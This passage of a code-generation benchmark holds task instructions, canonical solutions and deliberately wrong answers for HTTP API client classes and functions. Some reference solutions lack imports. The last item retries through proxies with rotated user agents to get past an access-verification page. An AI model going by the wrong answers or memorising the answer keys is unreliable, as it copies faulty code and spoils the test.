    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\n\nclass PlexMediaServer:\n    TIMEOUT = 10\n\n    def __init__(self, mediaserver_instance):\n        self.object = mediaserver_instance\n\n    def make_request(self, uri='/', params=None):\n        if params is None:\n            params = {}\n        url = self.object.server_url + uri\n        headers = {\n            'Authorization': f'Token {self.object.token}'\n        }\n        try:\n            response = requests.get(\n                url,\n                params=params,\n                headers=headers,\n                timeout=self.TIMEOUT,\n                verify=self.object.verify_ssl\n            )\n            response.raise_for_status()\n            return response\n        except requests.exceptions.RequestException as e:\n            raise RuntimeError(f\"Request failed: {e}\") from e\n\n    def validate(self):\n        try:\n            response = self.make_request('/status.xml')\n            if response.status_code != 200:\n                raise RuntimeError(\"Server connection validation failed\")\n        except Exception as e:\n            raise RuntimeError(f\"Validation failed: {e}\") from e\n\n        for lib_id in self.object.libraries:\n            try:\n                response = self.make_request(f'/library/sections/{lib_id}.xml')\n                if response.status_code != 200:\n                    raise RuntimeError(f\"Library {lib_id} not found\")\n            except Exception as e:\n                raise RuntimeError(f\"Library validation failed for {lib_id}: {e}\") from e\n\n        return True\n\n    def update(self):\n        for lib_id in self.object.libraries:\n            try:\n                response = self.make_request(f'/library/refresh.xml?sectionId={lib_id}')\n                if response.status_code != 200:\n                    raise RuntimeError(f\"Failed to refresh library {lib_id}\")\n            except Exception as e:\n                raise RuntimeError(f\"Update failed for library {lib_id}: {e}\") from e\n        return True"
  },
  {
    "Task_id": 11,
    "Instruction": "Task Description: Implement a Python class to interact with Hurricane Electric's dynamic DNS API for updating DNS records programmatically.\n\nClass Description: HurricaneElectricAPI is a client class that handles communication with Hurricane Electric's DNS service to update DNS records. It supports both direct connections and proxy connections.\n\nAttributes:\n- SITE: [str] - The target domain for the Hurricane Electric API (dyn.dns.he.net)\n- METHOD: [str] - The HTTP method to use for requests (POST)\n- ACTION: [str] - The API endpoint path (nic/update)\n- TOKEN_PARAM: [str] - The parameter name for the authentication token (password)\n- TOKEN: [str] - The authentication token/password for API access\n- PROXY: [str/None] - Optional proxy server address\n\nMethods:\n- __init__(token=\"password\", proxy=None) -> None - Initializes the API client with optional token and proxy settings\n- _request(param=None, **params) -> str - Internal method to make HTTP requests to the API\n- update_record(domain, value, record_type=\"A\") -> str - Updates a DNS record with the given value\n\nMethod Details:\n1. _request(param=None, **params) -> str\n   - Makes an HTTPS request to the Hurricane Electric API\n   - Input:\n     - param: [dict/None] - Optional base parameters\n     - **params: Additional request parameters\n   - Output: [str] - API response string\n   - Raises Exception on HTTP errors or API failures\n\n2. update_record(domain, value, record_type=\"A\") -> str\n   - Updates a DNS record with the specified value\n   - Input:\n     - domain: [str] - The domain name to update\n     - value: [str] - The new IP address or value\n     - record_type: [str] - The DNS record type (default: \"A\")\n   - Output: [str] - Human-readable status message about the update\n   - Raises Exception if the update fails",
    "Canonical_solution": "from http.client import HTTPSConnection\nfrom urllib.parse import urlencode\nfrom logging import info, debug, warning\n\nclass HurricaneElectricAPI:\n    def __init__(self, token=\"password\", proxy=None):\n        self.SITE = \"dyn.dns.he.net\"\n        self.METHOD = \"POST\"\n        self.ACTION = \"nic/update\"\n        self.TOKEN_PARAM = \"password\"\n        self.TOKEN = token\n        self.PROXY = proxy\n\n    def _request(self, param=None, **params):\n        if param:\n            params.update(param)\n\n        params.update({self.TOKEN_PARAM: '***'})\n        info(\"%s/%s : %s\", self.SITE, self.ACTION, params)\n        params[self.TOKEN_PARAM] = self.TOKEN\n\n        if self.PROXY:\n            conn = HTTPSConnection(self.PROXY)\n            conn.set_tunnel(self.SITE, 443)\n        else:\n            conn = HTTPSConnection(self.SITE)\n\n        conn.request(self.METHOD, '/' + self.ACTION, urlencode(params), {\n            \"Content-type\": \"application/x-www-form-urlencoded\"\n        })\n        response = conn.getresponse()\n        res = response.read().decode('utf8')\n        conn.close()\n\n        if response.status < 200 or response.status >= 300:\n            warning('%s : error[%d]:%s', self.ACTION, response.status, res)\n            raise Exception(res)\n        else:\n            debug('%s : result:%s', self.ACTION, res)\n            if not res:\n                raise Exception(\"empty response\")\n            elif res[:5] == \"nochg\" or res[:4] == \"good\":\n                return res\n            else:\n                raise Exception(res)\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        info(\">>>>>%s(%s)\", domain, record_type)\n        res = self._request(hostname=domain, myip=value)\n        if res[:4] == \"good\":\n            result = \"Record updated. New IP is: \" + res[5:-1]\n        elif res[:5] == \"nochg\":\n            result = \"IP not changed. IP is: \" + res[6:-1]\n        else:\n            result = \"Record update failed.\"\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import requests\n\nclass HurricaneElectricAPI:\n    SITE = \"dyn.dns.he.net\"\n    METHOD = \"POST\"\n    ACTION = \"/nic/update\"\n    TOKEN_PARAM = \"password\"\n\n    def __init__(self, token=\"password\", proxy=None):\n        self.TOKEN = token\n        self.PROXY = proxy\n\n    def _request(self, param=None, **params):\n        if param is None:\n            param = {}\n        all_params = {**param, **params}\n        url = f\"https://{self.SITE}{self.ACTION}\"\n        headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n        proxies = {'http': self.PROXY, 'https': self.PROXY} if self.PROXY else None\n        response = requests.post(url, data=all_params, headers=headers, proxies=proxies)\n        if response.status_code != 200:\n            raise Exception(f\"HTTP error: {response.status_code} - {response.text}\")\n        if \"No good\" in response.text:\n            raise Exception(\"API update failed\")\n        return response.text\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        params = {\n            'password': self.TOKEN,\n            'host': domain,\n            'myip': value,\n            'recordtype': record_type\n        }\n        response = self._request(**params)\n        if \"NOCHG\" in response:\n            return \"No changes made.\"\n        elif \"OK\" in response:\n            return \"Updated successfully.\"\n        else:\n            raise Exception(\"Unknown response from API\")"
  },
  {
    "Task_id": 110,
    "Instruction": "Task Description: Create a function that retrieves word embeddings from either a local API or OpenAI's API based on the specified model.\n\nFunction Description: The function `get_embedding_from_api` fetches a word embedding vector by making an HTTP POST request to a local API endpoint or using OpenAI's API, depending on the model specified. It handles the response, checks for errors, and returns the embedding as a NumPy array if successful.\n\nInput:\n- `word` (str): The input word or text for which to generate an embedding.\n- `model` (str, optional): The name of the model to use for generating embeddings. Defaults to \"vicuna-7b-v1.1\". If the model name contains \"ada\", it uses OpenAI's API.\n\nOutput:\n- Returns a NumPy array containing the word embedding if the request is successful.\n- Returns None if an error occurs (prints the error details to the console).",
    "Canonical_solution": "import json\nimport requests\nimport numpy as np\n\ndef get_embedding_from_api(word, model=\"vicuna-7b-v1.1\"):\n    if \"ada\" in model:\n        resp = openai.Embedding.create(\n            model=model,\n            input=word,\n        )\n        embedding = np.array(resp[\"data\"][0][\"embedding\"])\n        return embedding\n\n    url = \"http://localhost:8000/v1/embeddings\"\n    headers = {\"Content-Type\": \"application/json\"}\n    data = json.dumps({\"model\": model, \"input\": word})\n\n    response = requests.post(url, headers=headers, data=data)\n    if response.status_code == 200:\n        embedding = np.array(response.json()[\"data\"][0][\"embedding\"])\n        return embedding\n    else:\n        print(f\"Error: {response.status_code} - {response.text}\")\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nimport numpy as np\nimport os\n\ndef get_embedding_from_api(word, model=\"vicuna-7b-v1.1\"):\n    if \"ada\" in model:\n        url = \"https://api.openai.com/v1/embeddings\"\n        headers = {\n            \"Authorization\": f\"Bearer {os.environ.get('OPENAI_API_KEY')}\",\n            \"Content-Type\": \"application/json\"\n        }\n        data = {\n            \"input\": word,\n            \"model\": model\n        }\n        try:\n            response = requests.post(url, headers=headers, json=data)\n            response.raise_for_status()\n            embedding = np.array(response.json()['data'][0]['embedding'])\n            return embedding\n        except requests.exceptions.RequestException as e:\n            print(f\"OpenAI API error: {e}\")\n            return None\n    else:\n        url = \"http://localhost:8080/embedding\"\n        headers = {\"Content-Type\": \"application/json\"}\n        data = {\"text\": word}\n        try:\n            response = requests.post(url, json=data)\n            response.raise_for_status()\n            embedding = np.array(response.json()['embedding'])\n            return embedding\n        except requests.exceptions.RequestException as e:\n            print(f\"Local API error: {e}\")\n            return None"
  },
  {
    "Task_id": 112,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for interacting with the Pulsstory ExternalSyncAPI, handling authentication, data retrieval, and activity synchronization.\n\nClass Description: The PulsstoryHTTPClient class provides methods to interact with the Pulsstory API, including user authentication, activity download/upload, and token management. It handles HTTP requests, error responses, and data serialization.\n\nAttributes:\n- URLBase: str - The base URL for all API endpoints\n- PULSSTORY_CLIENT_ID: str - Client ID for API authentication\n- PULSSTORY_CLIENT_SECRET: str - Client secret for API authentication\n\nMethods:\n- _api_request(endpoint: str, service_record: object = None, method: str = \"POST\", data: dict = None, headers: dict = None, files: dict = None) -> dict - Internal method to make API requests and handle responses\n- _apiData(service_record: object) -> dict - Helper method to prepare authentication data\n- get_user_id(service_record: object) -> str - Retrieves user ID from the API\n- get_api_uris(service_record: object) -> dict - Gets API endpoint URIs from the service\n- retrieve_authorization_token(code: str) -> str - Exchanges an authorization code for an access token\n- revoke_authorization(service_record: object) -> None - Revokes an existing authorization\n- download_activity(service_record: object, activity_id: str) -> dict - Downloads activity data\n- upload_activity(service_record: object, upload_data: dict, uris: dict) -> str - Uploads activity data as a compressed file",
    "Canonical_solution": "from tapiriik.settings import PULSSTORY_CLIENT_ID, PULSSTORY_CLIENT_SECRET\nimport requests\nimport urllib.parse\nimport json\n\nclass PulsstoryHTTPClient:\n    def __init__(self, base_url, client_id=None, client_secret=None):\n        self.URLBase = base_url\n        self.PULSSTORY_CLIENT_ID = client_id or PULSSTORY_CLIENT_ID\n        self.PULSSTORY_CLIENT_SECRET = client_secret or PULSSTORY_CLIENT_SECRET\n\n    def _api_request(self, endpoint, service_record=None, method=\"POST\", data=None, headers=None, files=None):\n        url = self.URLBase + endpoint\n        request_data = self._apiData(service_record) if service_record else {}\n        if data:\n            request_data.update(data)\n        \n        if method == \"POST\":\n            response = requests.post(url, data=request_data, headers=headers, files=files)\n        else:\n            raise ValueError(\"Unsupported HTTP method\")\n\n        if response.status_code != 200:\n            if response.status_code in [401, 403]:\n                raise APIException(\"No authorization for request\", block=True, user_exception=UserException(UserExceptionType.Authorization, intervention_required=True))\n            raise APIException(f\"Request failed with status {response.status_code}: {response.text}\")\n\n        return response.json()\n\n    def _apiData(self, service_record):\n        return {\"access_token\": service_record.Authorization[\"Token\"]}\n\n    def get_user_id(self, service_record):\n        return self._api_request(\"/ExternalSyncAPI/GetUserId\", service_record)[\"userID\"]\n\n    def get_api_uris(self, service_record):\n        uris = self._api_request(\"/ExternalSyncAPI/Uris\", service_record)\n        for k in uris.keys():\n            if isinstance(uris[k], str):\n                uris[k] = self.URLBase + uris[k]\n        return uris\n\n    def retrieve_authorization_token(self, code):\n        params = {\n            \"code\": code,\n            \"client_id\": self.PULSSTORY_CLIENT_ID,\n            \"client_secret\": self.PULSSTORY_CLIENT_SECRET\n        }\n        response = requests.post(\n            self.URLBase + \"/ExternalSyncAPI/GenerateToken\",\n            data=urllib.parse.urlencode(params),\n            headers={\"Content-Type\": \"application/x-www-form-urlencoded\"}\n        )\n        if response.status_code != 200:\n            raise APIException(\"Invalid code\")\n        return response.json()[\"access_token\"]\n\n    def revoke_authorization(self, service_record):\n        response = requests.post(self.URLBase + \"/ExternalSyncAPI/Deauthorize\", data=self._apiData(service_record))\n        if response.status_code not in [200, 204]:\n            raise APIException(f\"Unable to deauthorize token, status {response.status_code}\")\n\n    def download_activity(self, service_record, activity_id):\n        return self._api_request(activity_id, service_record)\n\n    def upload_activity(self, service_record, upload_data, uris):\n        json_data = json.dumps(upload_data)\n        buffer = io.BytesIO()\n        with zipfile.ZipFile(buffer, 'w') as myzip:\n            myzip.writestr('activity.txt', json_data, compress_type=zipfile.ZIP_DEFLATED)\n        files = {\"data\": buffer.getvalue()}\n        return self._api_request(uris[\"upload_activity_zip\"], service_record, files=files)[\"Id\"]",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "class PulsstoryHTTPClient:\n    def __init__(self, url_base: str, client_id: str, client_secret: str):\n        self.URLBase = url_base\n        self.PULSSTORY_CLIENT_ID = client_id\n        self.PULSSTORY_CLIENT_SECRET = client_secret\n\n    def _api_request(self, endpoint: str, service_record: object = None, method: str = \"POST\", data: dict = None, headers: dict = None, files: dict = None) -> dict:\n        url = f\"{self.URLBase}/{endpoint}\"\n        try:\n            if method == \"GET\":\n                response = requests.get(url, params=data, headers=headers)\n            elif method == \"POST\":\n                response = requests.post(url, json=data, headers=headers, files=files)\n            elif method == \"DELETE\":\n                response = requests.delete(url, headers=headers)\n            else:\n                raise ValueError(f\"Unsupported method: {method}\")\n            response.raise_for_status()\n            return response.json()\n        except requests.RequestException as e:\n            raise RuntimeError(f\"API request failed: {e}\") from e\n\n    def _apiData(self, service_record: object) -> dict:\n        return {\n            'client_id': self.PULSSTORY_CLIENT_ID,\n            'client_secret': self.PULSSTORY_CLIENT_SECRET\n        }\n\n    def get_user_id(self, service_record: object) -> str:\n        response = self._api_request(\"user\", service_record=service_record)\n        return response.get('user_id')\n\n    def get_api_uris(self, service_record: object) -> dict:\n        response = self._api_request(\"uris\", service_record=service_record)\n        return response\n\n    def retrieve_authorization_token(self, code: str) -> str:\n        data = {\n            'grant_type': 'authorization_code',\n            'code': code,\n            'redirect_uri': 'https://example.com/callback'\n        }\n        headers = self._apiData(service_record=None)\n        response = self._api_request(\"token\", method=\"POST\", data=data, headers=headers)\n        return response.get('access_token')\n\n    def revoke_authorization(self, service_record: object) -> None:\n        headers = self._apiData(service_record=service_record)\n        self._api_request(\"revoke\", method=\"DELETE\", headers=headers)\n\n    def download_activity(self, service_record: object, activity_id: str) -> dict:\n        endpoint = f\"activities/{activity_id}\"\n        response = self._api_request(endpoint, service_record=service_record)\n        return response\n\n    def upload_activity(self, service_record: object, upload_data: dict, uris: dict) -> str:\n        upload_endpoint = uris.get('upload')\n        if not upload_endpoint:\n            raise ValueError(\"No upload URI provided in uris\")\n        import gzip\n        import io\n        import json\n        json_data = json.dumps(upload_data)\n        compressed_data = gzip.compress(json_data.encode('utf-8'))\n        files = {'file': ('activity_data.gz', compressed_data)}\n        response = self._api_request(upload_endpoint, method=\"POST\", files=files)\n        return response.get('file_id') or response.get('url')"
  },
  {
    "Task_id": 113,
    "Instruction": "Task Description: Implement a Python class that interacts with OpenAI's GPT-4 Vision API to process image and text prompts, handling image encoding and API communication with retry logic.\n\nClass Description: OpenAIGPT4Vision is a client for OpenAI's GPT-4 Vision API that processes both text and image inputs. It handles image conversion to base64 format, API request construction, and response processing with built-in retry mechanisms for failed requests.\n\nAttributes:\napi_key: str - The OpenAI API key for authentication\nheaders: dict - HTTP headers including Content-Type and Authorization\nmax_new_tokens: int - Maximum number of tokens to generate in the response (default: 256)\n\nMethods:\n__init__(api_key: str, max_new_tokens: int = 256) -> None - Initializes the API client with authentication and configuration\nencode_image_to_base64(raw_image_data: PIL.Image.Image) -> str - Static method that converts PIL Image to base64 encoded string\ngenerate(text_prompt: str, raw_image_data: Union[PIL.Image.Image, dict, str]) -> str - Processes text and image input, calls the API, and returns the generated content\n_get_pil_image(raw_image_data: Union[PIL.Image.Image, dict, str]) -> PIL.Image.Image - Static helper method to convert various image formats to PIL Image object",
    "Canonical_solution": "import requests\nimport base64\nfrom PIL import Image\nimport io\nimport time\n\nclass OpenAIGPT4Vision:\n    def __init__(self, api_key: str, max_new_tokens: int = 256):\n        self.api_key = api_key\n        self.headers = {\"Content-Type\": \"application/json\", \"Authorization\": f\"Bearer {api_key}\"}\n        self.max_new_tokens = max_new_tokens\n\n    @staticmethod\n    def encode_image_to_base64(raw_image_data) -> str:\n        if isinstance(raw_image_data, Image.Image):\n            buffered = io.BytesIO()\n            raw_image_data.save(buffered, format=\"JPEG\")\n            return base64.b64encode(buffered.getvalue()).decode(\"utf-8\")\n        raise ValueError(\"The input image data must be a PIL.Image.Image\")\n\n    def generate(self, text_prompt: str, raw_image_data):\n        raw_image_data = self._get_pil_image(raw_image_data).convert(\"RGB\")\n        base64_image = self.encode_image_to_base64(raw_image_data)\n\n        payload = {\n            \"model\": \"gpt-4-vision-preview\",\n            \"messages\": [\n                {\n                    \"role\": \"user\",\n                    \"content\": [\n                        {\"type\": \"text\", \"text\": text_prompt},\n                        {\"type\": \"image_url\", \"image_url\": {\"url\": f\"data:image/jpeg;base64,{base64_image}\"}},\n                    ],\n                }\n            ],\n            \"max_tokens\": self.max_new_tokens,\n        }\n\n        retry = True\n        retry_times = 0\n        while retry and retry_times < 5:\n            response = requests.post(\"https://api.openai.com/v1/chat/completions\", headers=self.headers, json=payload)\n            if response.status_code == 200:\n                response_data = response.json()\n                return response_data[\"choices\"][0][\"message\"][\"content\"]\n            else:\n                print(f\"Failed to connect to OpenAI API: {response.status_code} - {response.text}. Retrying...\")\n                time.sleep(10)\n                retry_times += 1\n        return \"Failed to connect to OpenAI GPT4V API\"\n\n    @staticmethod\n    def _get_pil_image(raw_image_data) -> Image.Image:\n        if isinstance(raw_image_data, Image.Image):\n            return raw_image_data\n        elif isinstance(raw_image_data, dict) and \"bytes\" in raw_image_data:\n            return Image.open(io.BytesIO(raw_image_data[\"bytes\"]))\n        elif isinstance(raw_image_data, str):\n            image_bytes = base64.b64decode(raw_image_data)\n            return Image.open(io.BytesIO(image_bytes))\n        else:\n            raise ValueError(\"Unsupported image data format\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nfrom typing import Union\nimport base64\nfrom io import BytesIO\nfrom PIL import Image\nimport time\nimport random\n\nclass OpenAIGPT4Vision:\n    def __init__(self, api_key: str, max_new_tokens: int = 256):\n        self.api_key = api_key\n        self.headers = {\n            'Content-Type': 'application/json',\n            'Authorization': f'Bearer {api_key}'\n        }\n        self.max_new_tokens = max_new_tokens\n\n    @staticmethod\n    def encode_image_to_base64(raw_image_data: Image.Image) -> str:\n        img_byte_arr = BytesIO()\n        raw_image_data.save(img_byte_arr, format=raw_image_data.format)\n        img_byte_arr.seek(0)\n        return base64.b64encode(img_byte_arr.read()).decode('utf-8')\n\n    @staticmethod\n    def _get_pil_image(raw_image_data: Union[Image.Image, dict, str]) -> Image.Image:\n        if isinstance(raw_image_data, Image.Image):\n            return raw_image_data\n        elif isinstance(raw_image_data, str):\n            image_data = base64.b64decode(raw_image_data)\n            return Image.open(BytesIO(image_data))\n        elif isinstance(raw_image_data, dict):\n            image_data = raw_image_data.get('data', '')\n            return OpenAIGPT4Vision._get_pil_image(image_data)\n        else:\n            raise ValueError(\"Unsupported image format\")\n\n    def generate(self, text_prompt: str, raw_image_data: Union[Image.Image, dict, str]) -> str:\n        pil_image = self._get_pil_image(raw_image_data)\n        image_base64 = self.encode_image_to_base64(pil_image)\n        payload = {\n            \"model\": \"gpt-4-vision-preview\",\n            \"messages\": [\n                {\n                    \"role\": \"user\",\n                    \"content\": [\n                        {\"type\": \"text\", \"text\": text_prompt},\n                        {\"type\": \"image_url\", \"image_url\": {\"url\": f\"data:image/png;base64,{image_base64}\"}}\n                    ]\n                }\n            ],\n            \"max_tokens\": self.max_new_tokens\n        }\n        retries = 3\n        for i in range(retries + 1):\n            try:\n                response = requests.post(\n                    \"https://api.openai.com/v1/chat/completions\",\n                    headers=self.headers,\n                    json=payload\n                )\n                response.raise_for_status()\n                return response.json()['choices'][0]['message']['content']\n            except Exception as e:\n                if i < retries:\n                    time.sleep(random.uniform(1, 3))\n                    continue\n                else:\n                    raise\n        return \"\""
  },
  {
    "Task_id": 114,
    "Instruction": "Task Description: Write a Python function that downloads a schema file from a given URL and returns its local path. The function should handle cases where the file already exists locally and properly manage HTTP request failures.\n\nFunction Description: The function `download_schema_file` downloads a JSON schema file from a specified URL to a local path. It checks if the file already exists locally before attempting to download. If the download fails, it issues a warning and exits the script. The function uses the `requests` library for HTTP operations and handles file paths using `pathlib.Path`.\n\nInput: \n- `envs` (Dict[str, Any]): A dictionary containing environment variables with the following keys:\n  - `SIGMA_SCHEMA_FILE`: Optional local path for the schema file. If not provided, defaults to \"sigma-schema.json\" in the workspace.\n  - `SIGMA_SCHEMA_URL`: URL from which to download the schema file.\n  - `GITHUB_WORKSPACE`: Base directory path for resolving relative file paths.\n\nOutput: \n- `Path | NoReturn`: Returns the absolute path to the downloaded schema file if successful. If the download fails, the function exits the script with status code -1.",
    "Canonical_solution": "import os\nimport requests\nimport warnings\nfrom pathlib import Path\nfrom typing import Any, Dict, NoReturn\n\ndef download_schema_file(envs: Dict[str, Any]) -> Path | NoReturn:\n    \"\"\"Download the schema file from the given URL and return its path.\n\n    Args:\n        envs (Dict[str, Any]): A dictionary containing the environment variables\n            used by the action.\n\n    Returns:\n        Path | NoReturn: Path to the schema file or exit the script if\n            the file could not be downloaded.\n    \"\"\"\n\n    schema_file = envs[\"SIGMA_SCHEMA_FILE\"]\n    schema_url = envs[\"SIGMA_SCHEMA_URL\"]\n    if not schema_file:\n        schema_file = envs[\"GITHUB_WORKSPACE\"] / \"sigma-schema.json\"\n    else:\n        schema_file = Path(schema_file)\n        if not schema_file.exists():\n            schema_file = envs[\"GITHUB_WORKSPACE\"] / schema_file\n\n    if not schema_file.exists():\n        response = requests.get(schema_url)\n        if response.status_code == 200:\n            with open(schema_file, \"wb\") as f:\n                f.write(response.content)\n        else:\n            warnings.warn(\n                f\"Failed to download schema file {schema_file}, skipping validation\"\n            )\n            os._exit(-1)\n    return (envs[\"GITHUB_WORKSPACE\"] / schema_file).absolute()",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nimport sys\nfrom pathlib import Path\n\ndef download_schema_file(envs):\n    workspace = Path(envs['GITHUB_WORKSPACE'])\n    local_path_str = envs.get('SIGMA_SCHEMA_FILE')\n    if local_path_str is None:\n        local_path = workspace / 'sigma-schema.json'\n    else:\n        local_path = Path(local_path_str)\n        if not local_path.is_absolute():\n            local_path = workspace / local_path\n    if local_path.exists():\n        return local_path\n    url = envs['SIGMA_SCHEMA_URL']\n    try:\n        response = requests.get(url, stream=True)\n        response.raise_for_status()\n    except requests.exceptions.RequestException as e:\n        print(f\"Warning: Failed to download schema file. {e}\")\n        sys.exit(-1)\n    try:\n        local_path.write_bytes(response.content)\n    except IOError as e:\n        print(f\"Warning: Failed to write schema file. {e}\")\n        sys.exit(-1)\n    return local_path"
  },
  {
    "Task_id": 116,
    "Instruction": "Task Description: Create a Python class that interacts with a web API to submit crawling tasks and retrieve their results, supporting both asynchronous and synchronous operations.\n\nClass Description: The Crawl4AiTester class provides functionality to interact with a web API for submitting URL crawling tasks. It handles authentication, task submission, and result retrieval with both asynchronous (polling) and synchronous approaches.\n\nAttributes:\n- base_url: str - The base URL of the API server (default: \"http://localhost:11235\")\n- api_token: str - The authentication token for API access (can be set via environment variable)\n- headers: dict - HTTP headers including the authorization token if provided\n\nMethods:\n- __init__(base_url: str = \"http://localhost:11235\", api_token: str = None) -> None - Initializes the API client with optional base URL and API token\n- submit_and_wait(request_data: Dict[str, Any], timeout: int = 300) -> Dict[str, Any] - Submits an asynchronous crawling task and polls for results until completion or timeout\n- submit_sync(request_data: Dict[str, Any]) -> Dict[str, Any] - Submits a synchronous crawling task and returns the immediate response",
    "Canonical_solution": "import requests\nimport os\nfrom typing import Dict, Any\n\nclass Crawl4AiTester:\n    def __init__(self, base_url: str = \"http://localhost:11235\", api_token: str = None):\n        self.base_url = base_url\n        self.api_token = api_token or os.getenv('CRAWL4AI_API_TOKEN')\n        self.headers = {'Authorization': f'Bearer {self.api_token}'} if self.api_token else {}\n        \n    def submit_and_wait(self, request_data: Dict[str, Any], timeout: int = 300) -> Dict[str, Any]:\n        response = requests.post(f\"{self.base_url}/crawl\", json=request_data, headers=self.headers)\n        if response.status_code == 403:\n            raise Exception(\"API token is invalid or missing\")\n        task_id = response.json()[\"task_id\"]\n        \n        start_time = time.time()\n        while True:\n            if time.time() - start_time > timeout:\n                raise TimeoutError(f\"Task {task_id} did not complete within {timeout} seconds\")\n                \n            result = requests.get(f\"{self.base_url}/task/{task_id}\", headers=self.headers)\n            status = result.json()\n            \n            if status[\"status\"] == \"failed\":\n                raise Exception(f\"Task failed: {status.get('error')}\")\n                \n            if status[\"status\"] == \"completed\":\n                return status\n                \n            time.sleep(2)\n            \n    def submit_sync(self, request_data: Dict[str, Any]) -> Dict[str, Any]:\n        response = requests.post(f\"{self.base_url}/crawl_sync\", json=request_data, headers=self.headers, timeout=60)\n        if response.status_code == 408:\n            raise TimeoutError(\"Task did not complete within server timeout\")\n        response.raise_for_status()\n        return response.json()",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import os\nimport requests\nimport time\nfrom typing import Dict, Any\n\nclass Crawl4AiTester:\n    def __init__(self, base_url: str = \"http://localhost:11235\", api_token: str = None):\n        self.base_url = base_url\n        self.api_token = api_token or os.environ.get('API_TOKEN')\n        if not self.api_token:\n            raise ValueError(\"API token is required for authentication.\")\n        self.headers = {\n            'Authorization': f'Bearer {self.api_token}'\n        }\n    \n    def submit_sync(self, request_data: Dict[str, Any]) -> Dict[str, Any]:\n        url = f\"{self.base_url}/submit\"\n        response = requests.post(url, json=request_data, headers=self.headers)\n        response.raise_for_status()\n        return response.json()\n    \n    def submit_and_wait(self, request_data: Dict[str, Any], timeout: int = 300) -> Dict[str, Any]:\n        url = f\"{self.base_url}/submit\"\n        response = requests.post(url, json=request_data, headers=self.headers)\n        response.raise_for_status()\n        task_id = response.json().get('task_id')\n        if not task_id:\n            raise ValueError(\"Task ID not found in response.\")\n        \n        end_time = time.time() + timeout\n        while time.time() < end_time:\n            status_url = f\"{self.base_url}/task/status/{task_id}\"\n            status_response = requests.get(status_url, headers=self.headers)\n            status_response.raise_for_status()\n            status = status_response.json()\n            \n            if status.get('status') == 'completed':\n                return status.get('result', {})\n            elif status.get('status') == 'failed':\n                raise Exception(f\"Task failed: {status.get('error_message')}\")\n            time.sleep(5)\n        \n        raise TimeoutError(\"Task did not complete within the timeout period.\")"
  },
  {
    "Task_id": 118,
    "Instruction": "Task Description: Create a Python class that implements HTTP client functionality with proxy support and retry mechanism for handling web requests.\n\nClass Description: The HTTPClient class provides methods for making HTTP GET and POST requests with configurable headers, proxy settings, and automatic retry on failure. It includes features like user-agent rotation and basic response validation.\n\nAttributes:\n- ua: [UserAgent] - Instance for generating random user-agent strings\n- proxyHost: [str] - Proxy server host address\n- proxyPort: [str] - Proxy server port number\n- proxyUser: [str] - Proxy authentication username\n- proxyPass: [str] - Proxy authentication password\n- proxies: [dict] - Configured proxy settings dictionary for HTTP/HTTPS\n\nMethods:\n- get_request(url, headers=None, params=None, timeout=4) -> [requests.Response or None] - Sends HTTP GET request to specified URL with optional headers and query parameters. Returns response if successful (status code 200 and no validation text), otherwise None after retries.\n- post_request(url, data=None, headers=None, timeout=4) -> [requests.Response or None] - Sends HTTP POST request to specified URL with optional data and headers. Returns response if successful (status code 200 and no validation text), otherwise None after retries.",
    "Canonical_solution": "import csv\nimport os\nimport re\nimport warnings\nimport requests\nfrom fake_useragent import UserAgent\nfrom scrapy import Selector\n\nclass HTTPClient:\n    def __init__(self):\n        self.ua = UserAgent()\n        self.proxyHost = \"http-dyn.abuyun.com\"\n        self.proxyPort = \"9020\"\n        self.proxyUser = \"\"\n        self.proxyPass = \"\"\n        \n        proxyMeta = \"http://%(user)s:%(pass)s@%(host)s:%(port)s\" % {\n            \"host\": self.proxyHost,\n            \"port\": self.proxyPort,\n            \"user\": self.proxyUser,\n            \"pass\": self.proxyPass,\n        }\n\n        self.proxies = {\n            \"http\": proxyMeta,\n            \"https\": proxyMeta,\n        }\n\n    def get_request(self, url, headers=None, params=None, timeout=4):\n        if headers is None:\n            headers = {\n                'sec-fetch-dest': 'document',\n                'sec-fetch-mode': 'navigate',\n                'sec-fetch-site': 'none',\n                'sec-fetch-user': '?1',\n                'upgrade-insecure-requests': '1',\n                'user-agent': self.ua.chrome\n            }\n            \n        request_count = 0\n        while request_count < 15:\n            try:\n                response = requests.get(url, headers=headers, proxies=self.proxies, params=params, timeout=timeout)\n                if response.status_code == 200 and ('\u8bbf\u95ee\u9a8c\u8bc1' not in response.text):\n                    return response\n                request_count += 1\n            except:\n                request_count += 1\n        return None\n\n    def post_request(self, url, data=None, headers=None, timeout=4):\n        if headers is None:\n            headers = {\n                'sec-fetch-dest': 'document',\n                'sec-fetch-mode': 'navigate',\n                'sec-fetch-site': 'none',\n                'sec-fetch-user': '?1',\n                'upgrade-insecure-requests': '1',\n                'user-agent': self.ua.chrome\n            }\n            \n        request_count = 0\n        while request_count < 15:\n            try:\n                response = requests.post(url, data=data, headers=headers, proxies=self.proxies, timeout=timeout)\n                if response.status_code == 200 and ('\u8bbf\u95ee\u9a8c\u8bc1' not in response.text):\n                    return response\n                request_count += 1\n            except:\n                request_count += 1\n        return None",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
